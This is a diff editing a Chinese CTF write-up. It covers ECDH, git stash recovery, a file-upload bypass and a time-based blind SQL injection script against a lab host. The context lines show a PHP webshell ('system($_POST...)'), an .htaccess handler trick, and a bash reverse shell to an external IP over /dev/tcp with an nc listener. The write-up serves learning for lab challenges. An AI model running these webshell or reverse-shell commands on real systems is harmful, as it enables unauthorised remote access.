@@ -95,7 +95,7 @@ flag{filp_the_word!!!!!!!!}
 
 题目给了一个 `.sage` 文件，内部语法格式为 `python`，需要安装 [sagemath](https://mirrors.aliyun.com/sagemath/win/index.html). 可以参照[此篇文章](https://zhuanlan.zhihu.com/p/297736314)配置 sagemath 在 Jupyter 中的运行环境。
 
-根据标题和题目所给文件可以分析出，该题考察椭圆曲线的笛福赫尔曼算法的变种ECDH.
+根据标题和题目所给文件可以分析出，该题考察椭圆曲线的笛福赫尔曼算法的变种 ECDH.
 
 ECDH 需要解决的问题大致是：Alice 和 Bob 想要安全通信，中间人可能会窃听消息，但是没办法解密消息。
 
@@ -109,7 +109,7 @@ $$ {\rm E}: y^2 = x^3 + ax + b $$
 
 有限域 ${\rm GF}(p)$ 上的椭圆曲线表示式为
 $$ y^2 \equiv x^3 + ax + b \pmod{p} $$
-且满足 $$ 4a^3 + 27b^2 \pmod{p} $$
+且满足 $$ 4a^3 + 27b^2 \pmod{p} \not = 0 $$
 
 ECDH 中，$G$ 表示在同一个有限域上选择的用于生成子群的一个基点。ECDH 算法的流程大致如下：
 
@@ -273,7 +273,7 @@ flag{It_1s_a_fak3_but_r3al_PDF}
 
 Git 中有一个用于藏匿代码的指令 `stash`.
 
-查看缓存区
+查看缓存区：
 
 ```bash
 git stash list
@@ -285,15 +285,13 @@ git stash list
 flag.txt
 ```
 
-尝试撤销
-
-恢复缓存区
+尝试撤销，恢复缓存区：
 
 ```bash
 git stash pop
 ```
 
-再次查看 `flag.txt` 得到 flag
+再次查看 `flag.txt` 得到 flag.
 
 ```plain
 flag{Yesec#1s#c@ibi}
@@ -321,7 +319,7 @@ echo system($_POST['warma']);
 ![give_me_your_photo_1](image/week5/web/give_me_your_photo_1.png)
 ![give_me_your_photo_2](image/week5/web/give_me_your_photo_2.png)
 
-修改文件后缀为 `pht` `phtml` `pHp` 等都无法绕过，使用 Hex 再 `.php` 后面从插入 `%0A` 字符后![Uploading aes_decode.jpg… (5l6txkc49)]()也不管用。
+修改文件后缀为 `pht` `phtml` `pHp` 等都无法绕过，使用 Hex 再在`.php` 后面插入 `%0A` 字符后也不管用。
 
 ![give_me_your_photo_3](image/week5/web/give_me_your_photo_3.png)
 
@@ -338,6 +336,8 @@ AddHandler php5-script .jpg
 
 上传成功！
 
+再访问 `/upload/webshell.jpg`, 发现已经显示为 php.
+
 我们不妨再上传一个 `bash.png` 内容如下：
 
 ```bash
@@ -345,8 +345,6 @@ bash -i &> /dev/tcp/47.97.152.130/54188 0>&1
 ```
 
 然后在主控机上监听端口 `nc -lvp 54188`，在 WebShell 执行该文件拿到 shell.
-
-再访问 `/upload/webshell.jpg`, 发现已经显示为 php.
 
 ![give_me_your_photo_4](image/week5/web/give_me_your_photo_4.png)
 
@@ -608,7 +606,7 @@ from time import sleep
 import requests
 
 # 字母表
-ALPHABET = "?!-_/\{} abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!?-_ @#/\\"
 # 靶机地址
 URL = "http://a4987151-d67a-4396-b3d4-10fa0937cba5.node4.buuoj.cn:81/comments.php"
 # 请求发送间隔
@@ -803,13 +801,13 @@ print(flag)
 输出结果为
 
 ```python
-["flag{ju2t_let_me_s1eep_f0r_a_whi1e}"]
+['flag{ju2t_let_me_s1eep_f0r_a_whi1e}']
 ```
 
 但是提交的 flag 为
 
 ```plain
-flag{ju2t_let_me_s1eep_f0r_a_whi1e}
+flag{Ju2t_let_me_s1eep_f0r_a_whi1e}
 ```
 
 由于上述是使用延时盲注，所以脚本判断if是否判真并不稳定，可以通过修改脚本开头的 `REQUEST_TTL` 进行调整。但是耗时长是一个重大问题。
